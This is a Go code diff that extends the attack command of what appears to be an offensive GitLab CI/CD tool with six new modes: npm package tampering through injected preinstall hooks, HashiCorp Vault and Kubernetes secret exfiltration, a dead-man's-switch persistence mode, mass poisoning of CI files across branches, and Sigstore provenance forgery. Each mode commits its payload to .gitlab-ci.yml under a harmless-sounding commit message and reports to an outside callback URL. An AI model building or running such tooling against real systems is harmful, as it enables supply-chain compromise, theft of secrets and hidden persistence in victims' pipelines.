@@ -209,6 +209,36 @@ var (
 	atkC2Target      string // domain/URL for the C2 channel
 	atkC2KeepAlive   bool   // keep C2 channel alive with heartbeats
 	atkC2CallbackURL string // C2 callback URL
+	// npm tamper mode (supply chain npm package poisoning)
+	atkNpmTamper       bool
+	atkNpmRegistry     string // npm registry URL
+	atkNpmPackage      string // specific package to tamper
+	atkNpmInjectScript string // preinstall hook content
+	// Vault enumeration mode (HashiCorp Vault secrets sweep)
+	atkVaultEnum       bool
+	atkVaultAddr       string // Vault server URL
+	atkVaultAuthMethod string // token|kubernetes|aws
+	// K8s secrets sweep mode (Kubernetes RBAC exploit)
+	atkK8sSecrets     bool
+	atkK8sNamespaces  string // comma-separated namespaces
+	// Dead Man's Switch mode (persistence with revocation detection)
+	atkDeadManSwitch bool
+	atkDMSMonitorURL string // endpoint to probe
+	atkDMSInterval   string // check interval seconds
+	atkDMSTTL        string // TTL before self-removal
+	atkDMSHandler    string // command on revocation
+	atkDMSPlatform   string // linux|macos
+	// Branch mutator mode (mass branch CI poisoning)
+	atkBranchMutator   bool
+	atkMutatorFile     string // file to create/update on each branch
+	atkMutatorContent  string // content to write
+	atkMutatorMaxBranches int // max branches to target
+	// Sigstore provenance forgery mode
+	atkSigstore        bool
+	atkSigstorePackage string // package name for attestation
+	atkSigstoreVersion string // package version
+	// Shared co-author trailer
+	atkCoAuthor string // co-authored-by trailer for commits
 )
 
 // narrow interface to allow test fakes
@@ -408,8 +438,26 @@ var attackCmd = &cobra.Command{
 			if atkC2Channel {
 				modes++
 			}
+			if atkNpmTamper {
+				modes++
+			}
+			if atkVaultEnum {
+				modes++
+			}
+			if atkK8sSecrets {
+				modes++
+			}
+			if atkDeadManSwitch {
+				modes++
+			}
+			if atkBranchMutator {
+				modes++
+			}
+			if atkSigstore {
+				modes++
+			}
 			if modes != 1 {
-				return fmt.Errorf("select exactly one mode: --commit-ci, --secrets, --cleanup, --deploy-key, --add-member, --ai-inject, --inject-script, --lotp-inject, --auto-merge, --tamper-release, --tamper-package, --tamper-tag, --harvest, --ror-listen, --memory-dump, --supply-chain-worm, --container-escape, --variable-inject, or --c2-channel (or use --payload-only or --discover-tags)")
+				return fmt.Errorf("select exactly one mode: --commit-ci, --secrets, --cleanup, --deploy-key, --add-member, --ai-inject, --inject-script, --lotp-inject, --auto-merge, --tamper-release, --tamper-package, --tamper-tag, --harvest, --ror-listen, --memory-dump, --supply-chain-worm, --container-escape, --variable-inject, --c2-channel, --npm-tamper, --vault-enum, --k8s-secrets, --dead-man-switch, --branch-mutator, or --sigstore (or use --payload-only or --discover-tags)")
 			}
 		}
 
@@ -1700,6 +1748,316 @@ var attackCmd = &cobra.Command{
 			return nil
 		}
 
+		// npm-tamper mode: inject preinstall hooks into npm packages via CI
+		if atkNpmTamper {
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-npm-tamper"
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				return berr
+			}
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			if _, err := att.SetupUser(ctx); err != nil {
+				return fmt.Errorf("setup user: %w", err)
+			}
+			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
+				return err
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "build: update npm package configuration"
+			}
+			yaml := payloadgen.GenerateNpmTamperYAML(payloadgen.NpmTamperOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    parseTags(atkTags),
+					Manual:  atkManual,
+				},
+				RegistryURL:    strings.TrimSpace(atkNpmRegistry),
+				PackageName:    strings.TrimSpace(atkNpmPackage),
+				InjectedScript: strings.TrimSpace(atkNpmInjectScript),
+				CallbackURL:    strings.TrimSpace(atkWebhook),
+			})
+			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
+				return fmt.Errorf("commit npm tamper payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed npm tamper payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch   string `json:"branch"`
+					Registry string `json:"registry,omitempty"`
+					Package  string `json:"package,omitempty"`
+				}{
+					Branch:   finalBranch,
+					Registry: strings.TrimSpace(atkNpmRegistry),
+					Package:  strings.TrimSpace(atkNpmPackage),
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("npm tamper payload committed to branch %s", finalBranch))
+			return nil
+		}
+
+		// vault-enum mode: enumerate and exfiltrate HashiCorp Vault secrets
+		if atkVaultEnum {
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-vault-enum"
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				return berr
+			}
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			if _, err := att.SetupUser(ctx); err != nil {
+				return fmt.Errorf("setup user: %w", err)
+			}
+			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
+				return err
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "ci: add vault integration checks"
+			}
+			yaml := payloadgen.GenerateVaultEnumYAML(payloadgen.VaultEnumOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    parseTags(atkTags),
+					Manual:  atkManual,
+				},
+				VaultAddr:   strings.TrimSpace(atkVaultAddr),
+				AuthMethod:  strings.TrimSpace(atkVaultAuthMethod),
+				CallbackURL: strings.TrimSpace(atkWebhook),
+			})
+			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
+				return fmt.Errorf("commit vault enum payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed vault enum payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch     string `json:"branch"`
+					VaultAddr  string `json:"vault_addr,omitempty"`
+					AuthMethod string `json:"auth_method,omitempty"`
+				}{
+					Branch:     finalBranch,
+					VaultAddr:  strings.TrimSpace(atkVaultAddr),
+					AuthMethod: strings.TrimSpace(atkVaultAuthMethod),
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Vault enum payload committed to branch %s", finalBranch))
+			return nil
+		}
+
+		// k8s-secrets mode: sweep Kubernetes secrets via runner pod service account
+		if atkK8sSecrets {
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-k8s-secrets"
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				return berr
+			}
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			if _, err := att.SetupUser(ctx); err != nil {
+				return fmt.Errorf("setup user: %w", err)
+			}
+			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
+				return err
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "ci: add kubernetes integration tests"
+			}
+			var ns []string
+			if s := strings.TrimSpace(atkK8sNamespaces); s != "" {
+				for n := range strings.SplitSeq(s, ",") {
+					n = strings.TrimSpace(n)
+					if n != "" {
+						ns = append(ns, n)
+					}
+				}
+			}
+			yaml := payloadgen.GenerateK8sSecretsYAML(payloadgen.K8sSecretsOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    parseTags(atkTags),
+					Manual:  atkManual,
+				},
+				Namespaces:  ns,
+				CallbackURL: strings.TrimSpace(atkWebhook),
+			})
+			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
+				return fmt.Errorf("commit k8s secrets payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed k8s secrets payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch     string   `json:"branch"`
+					Namespaces []string `json:"namespaces,omitempty"`
+				}{
+					Branch:     finalBranch,
+					Namespaces: ns,
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("K8s secrets payload committed to branch %s", finalBranch))
+			return nil
+		}
+
+		// dead-man-switch mode: install persistence with token revocation detection
+		if atkDeadManSwitch {
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-dms"
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				return berr
+			}
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			if _, err := att.SetupUser(ctx); err != nil {
+				return fmt.Errorf("setup user: %w", err)
+			}
+			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
+				return err
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "ci: add health monitoring"
+			}
+			yaml := payloadgen.GenerateDeadManSwitchYAML(payloadgen.DeadManSwitchOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    parseTags(atkTags),
+					Manual:  atkManual,
+				},
+				MonitorURL:    strings.TrimSpace(atkDMSMonitorURL),
+				CheckInterval: strings.TrimSpace(atkDMSInterval),
+				TTL:           strings.TrimSpace(atkDMSTTL),
+				Handler:       strings.TrimSpace(atkDMSHandler),
+				Platform:      strings.TrimSpace(atkDMSPlatform),
+			})
+			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
+				return fmt.Errorf("commit dead man switch payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed dead man switch payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch   string `json:"branch"`
+					Platform string `json:"platform,omitempty"`
+					Handler  string `json:"handler,omitempty"`
+				}{
+					Branch:   finalBranch,
+					Platform: strings.TrimSpace(atkDMSPlatform),
+					Handler:  strings.TrimSpace(atkDMSHandler),
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Dead Man's Switch payload committed to branch %s", finalBranch))
+			return nil
+		}
+
+		// branch-mutator mode: mass branch CI poisoning via GitLab SDK
+		if atkBranchMutator {
+			content := strings.TrimSpace(atkMutatorContent)
+			if content == "" {
+				// Generate a default CI payload if no content provided
+				ci, cerr := renderPayload()
+				if cerr == nil && strings.TrimSpace(ci) != "" {
+					content = ci
+				}
+			}
+			if content == "" {
+				content = "stages: [test]\nmutated:\n  stage: test\n  script: [echo mutated]\n"
+			}
+			maxBranches := atkMutatorMaxBranches
+			if maxBranches <= 0 {
+				maxBranches = 10
+			}
+			opts := payloadgen.BranchMutatorOptions{
+				FilePath:    strings.TrimSpace(atkMutatorFile),
+				FileContent: content,
+				MaxBranches: maxBranches,
+				CallbackURL: strings.TrimSpace(atkWebhook),
+			}
+			result := payloadgen.RunBranchMutator(ctx, client.GL, atkTarget, opts, atkAuthorName, atkAuthorEmail, cmd.ErrOrStderr())
+			if outputJSON {
+				b, _ := json.MarshalIndent(result, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Branch mutator: %d/%d branches mutated", result.Mutated, result.Targeted))
+			if result.Errors > 0 {
+				renderWarning(cmd.OutOrStdout(), fmt.Sprintf("%d errors encountered", result.Errors))
+			}
+			return nil
+		}
+
+		// sigstore mode: forge Sigstore provenance attestations
+		if atkSigstore {
+			if strings.TrimSpace(atkBranch) == "" {
+				atkBranch = "gogatoz-sigstore"
+			}
+			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+			if berr != nil {
+				return berr
+			}
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			if _, err := att.SetupUser(ctx); err != nil {
+				return fmt.Errorf("setup user: %w", err)
+			}
+			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
+				return err
+			}
+			if strings.TrimSpace(atkMessage) == "" {
+				atkMessage = "ci: add provenance attestation"
+			}
+			yaml := payloadgen.GenerateSigstoreYAML(payloadgen.SigstoreOptions{
+				Common: payloadgen.CommonOptions{
+					JobName: strings.TrimSpace(atkJobName),
+					Stage:   strings.TrimSpace(atkStage),
+					Image:   strings.TrimSpace(atkImage),
+					Tags:    parseTags(atkTags),
+					Manual:  atkManual,
+				},
+				PackageName: strings.TrimSpace(atkSigstorePackage),
+				Version:     strings.TrimSpace(atkSigstoreVersion),
+				CallbackURL: strings.TrimSpace(atkWebhook),
+			})
+			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
+				return fmt.Errorf("commit sigstore payload: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed sigstore provenance payload to branch %s\n", finalBranch)
+			if outputJSON {
+				out := struct {
+					Branch      string `json:"branch"`
+					PackageName string `json:"package_name,omitempty"`
+					Version     string `json:"version,omitempty"`
+				}{
+					Branch:      finalBranch,
+					PackageName: strings.TrimSpace(atkSigstorePackage),
+					Version:     strings.TrimSpace(atkSigstoreVersion),
+				}
+				b, _ := json.MarshalIndent(out, "", "  ")
+				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
+				return err
+			}
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Sigstore provenance payload committed to branch %s", finalBranch))
+			return nil
+		}
+
 		// secrets mode
 		if atkSecrets {
 			// parse tags
@@ -2110,6 +2468,36 @@ func init() {
 	attackCmd.Flags().StringVar(&atkC2Target, "c2-target", "", "Domain/URL for the C2 channel")
 	attackCmd.Flags().BoolVar(&atkC2KeepAlive, "c2-keepalive", false, "Keep C2 channel alive with heartbeats")
 	attackCmd.Flags().StringVar(&atkC2CallbackURL, "c2-callback-url", "", "C2 callback URL")
+	// npm tamper mode flags
+	attackCmd.Flags().BoolVar(&atkNpmTamper, "npm-tamper", false, "Inject preinstall hooks into npm packages via CI (supply chain attack)")
+	attackCmd.Flags().StringVar(&atkNpmRegistry, "npm-registry", "", "npm registry URL (default: https://registry.npmjs.org)")
+	attackCmd.Flags().StringVar(&atkNpmPackage, "npm-package", "", "Specific npm package to tamper (auto-discover if empty)")
+	attackCmd.Flags().StringVar(&atkNpmInjectScript, "npm-inject-script", "", "Preinstall hook content to inject into package.json")
+	// Vault enumeration mode flags
+	attackCmd.Flags().BoolVar(&atkVaultEnum, "vault-enum", false, "Enumerate and exfiltrate secrets from reachable HashiCorp Vault instances")
+	attackCmd.Flags().StringVar(&atkVaultAddr, "vault-addr", "", "Vault server URL (falls back to $VAULT_ADDR)")
+	attackCmd.Flags().StringVar(&atkVaultAuthMethod, "vault-auth-method", "", "Vault auth method: token|kubernetes|aws (default: token)")
+	// K8s secrets sweep mode flags
+	attackCmd.Flags().BoolVar(&atkK8sSecrets, "k8s-secrets", false, "Sweep Kubernetes secrets via runner pod service account")
+	attackCmd.Flags().StringVar(&atkK8sNamespaces, "k8s-namespaces", "", "Comma-separated Kubernetes namespaces to target (empty = discover all)")
+	// Dead Man's Switch mode flags
+	attackCmd.Flags().BoolVar(&atkDeadManSwitch, "dead-man-switch", false, "Install persistence with token revocation detection (Dead Man's Switch)")
+	attackCmd.Flags().StringVar(&atkDMSMonitorURL, "dms-monitor-url", "", "Endpoint to probe with token (default: GitLab /api/v4/user)")
+	attackCmd.Flags().StringVar(&atkDMSInterval, "dms-interval", "", "Seconds between checks (default: 60)")
+	attackCmd.Flags().StringVar(&atkDMSTTL, "dms-ttl", "", "Seconds before self-removal (default: 86400)")
+	attackCmd.Flags().StringVar(&atkDMSHandler, "dms-handler", "", "Command to run on token revocation")
+	attackCmd.Flags().StringVar(&atkDMSPlatform, "dms-platform", "", "Platform: linux|macos (default: linux)")
+	// Branch mutator mode flags
+	attackCmd.Flags().BoolVar(&atkBranchMutator, "branch-mutator", false, "Iterate unprotected branches and commit a file to each (mass CI poisoning)")
+	attackCmd.Flags().StringVar(&atkMutatorFile, "mutator-file", "", "File to create/update on each branch (default: .gitlab-ci.yml)")
+	attackCmd.Flags().StringVar(&atkMutatorContent, "mutator-content", "", "Content to write to each branch")
+	attackCmd.Flags().IntVar(&atkMutatorMaxBranches, "mutator-max-branches", 10, "Max branches to target (default: 10)")
+	// Sigstore provenance forgery mode flags
+	attackCmd.Flags().BoolVar(&atkSigstore, "sigstore", false, "Forge Sigstore provenance attestations via CI OIDC tokens")
+	attackCmd.Flags().StringVar(&atkSigstorePackage, "sigstore-package", "", "Package name for the attestation subject")
+	attackCmd.Flags().StringVar(&atkSigstoreVersion, "sigstore-version", "", "Package version for the attestation")
+	// Shared co-author trailer
+	attackCmd.Flags().StringVar(&atkCoAuthor, "co-author", "", "Co-Authored-By trailer for commits")
 }
 
 func loadCIContent(inline, file string, fromStdin bool) (string, error) {
@@ -2256,6 +2644,60 @@ func renderPayload() (string, error) {
 			KeepAlive:   atkC2KeepAlive,
 			CallbackURL: strings.TrimSpace(atkC2CallbackURL),
 		}), nil
+	case "npm-tamper", "npm_tamper", "npmtamper":
+		return payloadgen.GenerateNpmTamperYAML(payloadgen.NpmTamperOptions{
+			Common:         common,
+			RegistryURL:    strings.TrimSpace(atkNpmRegistry),
+			PackageName:    strings.TrimSpace(atkNpmPackage),
+			InjectedScript: strings.TrimSpace(atkNpmInjectScript),
+			CallbackURL:    strings.TrimSpace(atkWebhook),
+		}), nil
+	case "vault-enum", "vault_enum", "vaultenum":
+		return payloadgen.GenerateVaultEnumYAML(payloadgen.VaultEnumOptions{
+			Common:      common,
+			VaultAddr:   strings.TrimSpace(atkVaultAddr),
+			AuthMethod:  strings.TrimSpace(atkVaultAuthMethod),
+			CallbackURL: strings.TrimSpace(atkWebhook),
+		}), nil
+	case "k8s-secrets", "k8s_secrets", "k8ssecrets":
+		var ns []string
+		if s := strings.TrimSpace(atkK8sNamespaces); s != "" {
+			for n := range strings.SplitSeq(s, ",") {
+				n = strings.TrimSpace(n)
+				if n != "" {
+					ns = append(ns, n)
+				}
+			}
+		}
+		return payloadgen.GenerateK8sSecretsYAML(payloadgen.K8sSecretsOptions{
+			Common:      common,
+			Namespaces:  ns,
+			CallbackURL: strings.TrimSpace(atkWebhook),
+		}), nil
+	case "dead-mans-switch", "dead_mans_switch", "deadmanswitch", "dms":
+		return payloadgen.GenerateDeadManSwitchYAML(payloadgen.DeadManSwitchOptions{
+			Common:        common,
+			MonitorURL:    strings.TrimSpace(atkDMSMonitorURL),
+			CheckInterval: strings.TrimSpace(atkDMSInterval),
+			TTL:           strings.TrimSpace(atkDMSTTL),
+			Handler:       strings.TrimSpace(atkDMSHandler),
+			Platform:      strings.TrimSpace(atkDMSPlatform),
+		}), nil
+	case "branch-mutator", "branch_mutator", "branchmutator":
+		return payloadgen.GenerateBranchMutatorYAML(payloadgen.BranchMutatorOptions{
+			Common:      common,
+			FilePath:    strings.TrimSpace(atkMutatorFile),
+			FileContent: strings.TrimSpace(atkMutatorContent),
+			MaxBranches: atkMutatorMaxBranches,
+			CallbackURL: strings.TrimSpace(atkWebhook),
+		}), nil
+	case "sigstore", "sigstore-provenance":
+		return payloadgen.GenerateSigstoreYAML(payloadgen.SigstoreOptions{
+			Common:      common,
+			PackageName: strings.TrimSpace(atkSigstorePackage),
+			Version:     strings.TrimSpace(atkSigstoreVersion),
+			CallbackURL: strings.TrimSpace(atkWebhook),
+		}), nil
 	default:
 		return "", fmt.Errorf("unsupported --payload: %s", atkPayload)
 	}
@@ -2287,6 +2729,20 @@ func parsePipelineURL(pipelineURL string) (int64, error) {
 		}
 	}
 	return 0, nil
+}
+
+// parseTags splits a comma-separated tag string into a slice.
+func parseTags(raw string) []string {
+	var tags []string
+	if strings.TrimSpace(raw) != "" {
+		for t := range strings.SplitSeq(raw, ",") {
+			t = strings.TrimSpace(t)
+			if t != "" {
+				tags = append(tags, t)
+			}
+		}
+	}
+	return tags
 }
 
 // ifErr returns err.Error() or empty string — used inline in variable-inject JSON output.
